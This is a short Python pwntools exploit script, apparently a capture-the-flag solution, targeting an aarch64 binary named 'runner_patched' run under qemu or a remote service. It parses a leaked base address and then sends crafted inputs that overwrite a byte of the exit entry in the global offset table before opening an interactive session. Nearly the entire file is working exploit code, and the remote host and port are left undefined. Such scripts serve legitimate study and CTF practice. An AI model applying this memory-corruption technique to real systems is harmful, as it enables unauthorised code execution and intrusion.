#!/usr/bin/env python3
from pwn import *

#context(terminal=['tmux', 'split-pane', '-vb', '-p80'])
elf = context.binary = ELF('./runner_patched')
libc = ELF('./lib/libc.so.6')
context(os="linux", arch="aarch64")
#context.log_level = "debug"

gs = """"""

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs, api=True)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process(["qemu-aarch64", "-L", ".", elf.path])

def pause():
  if args.GDB:
    io.gdb.interrupt_and_wait()

io = start()
io.timeout = 1

def rebase() -> int:
    base_addr = int(io.recvline().split(b"-")[0], 16)
    return base_addr

base = rebase()
log.info(f"bin base @ {base:#x}")
elf.address = base

io.sendlineafter(b"exit status >\n", b"\x00")
io.sendlineafter(b"address >\n", hex(elf.got.exit).encode())
io.sendlineafter(b"character >\n", b"A")

#io.sendlineafter(b"\n", b"00")
#io.sendlineafter(b"\n", hex(elf.got.exit+1).encode())
#io.sendlineafter(b"\n", b"A")

io.interactive()
